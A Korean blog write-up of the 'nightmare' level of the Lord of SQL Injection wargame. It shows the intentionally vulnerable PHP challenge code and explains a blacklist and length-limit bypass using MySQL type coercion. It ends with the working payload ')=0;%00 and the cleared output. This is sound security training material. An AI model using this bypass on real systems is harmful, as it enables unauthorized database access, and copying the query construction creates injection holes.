---
title: "[Lord of SQL Injection] LoS - nightmare 문제풀이"
date: 2018-08-06
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

이번 문제는 `nightmare`이다.
문제 이름 답게 엄청 고민 많이 했던 문제이다.  

<!--more-->

코드는 다음과 같다.  

```php
------------------------------------------------------------------------------------------
query : select id from prob_nightmare where pw=('') and id!='admin'
------------------------------------------------------------------------------------------

<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("nightmare"); 
  highlight_file(__FILE__); 
?>
```

이번에는 주석으로 사용했던 문자들이 다 필터링이 걸려 있다.
그리고 글자 수도 6글자 이내로 적어야 한다는 제한도 있다.
그럼 일단 주석에 대한 필터링도 우회해야 하고, `pw`에 `('')` 이런식으로 괄호가 생겨서 이 것도 어떻게 해결해야 할지 고민해야 했다.
결론적으로 이건 문제를 못풀겠어서 인터넷을 찾아봤었다.  

쿼리를 작성할 때, `pw=1=1` 형태로도 쓸 수 있다.
이럴 경우, `1=1`은 참이기 때문에 `pw=참`이 되어 쿼리가 정상적으로 실행된다.
이미 쿼리에 `('')` 은 있으므로, 이 공백과 비교했을 때 참이될 수 있는 값은 `0`이다.
이를 실제로 테스트 해 보기 위해 아래와 같이 `mysql`을 실행시켜보았다.  

```bash
mysql> select ''=0 ;
+------+
| ''=0 |
+------+
|    1 |
+------+
1 row in set (0.01 sec)

```

결과값이 1이 나오는 것을 알 수 있다.
그래서 `')=0`을 넣고, 뒤의 나머지 조건을 무시하게 하기 위해서 `;`과 `null`을 넣어주었다.  

```plain
?pw=')=0;%00
```

그랬더니 문제를 풀 수 있었다.  

```php
------------------------------------------------------------------------------------------------
query : select id from prob_nightmare where pw=('')=0;') and id!='admin'
------------------------------------------------------------------------------------------------

NIGHTMARE Clear!
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)|#|-/i', $_GET[pw])) exit("No Hack ~_~"); 
  if(strlen($_GET[pw])>6) exit("No Hack ~_~"); 
  $query = "select id from prob_nightmare where pw=('{$_GET[pw]}') and id!='admin'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) solve("nightmare"); 
  highlight_file(__FILE__); 
?>
```

---

```plain
NIGHTMARE Clear!!
```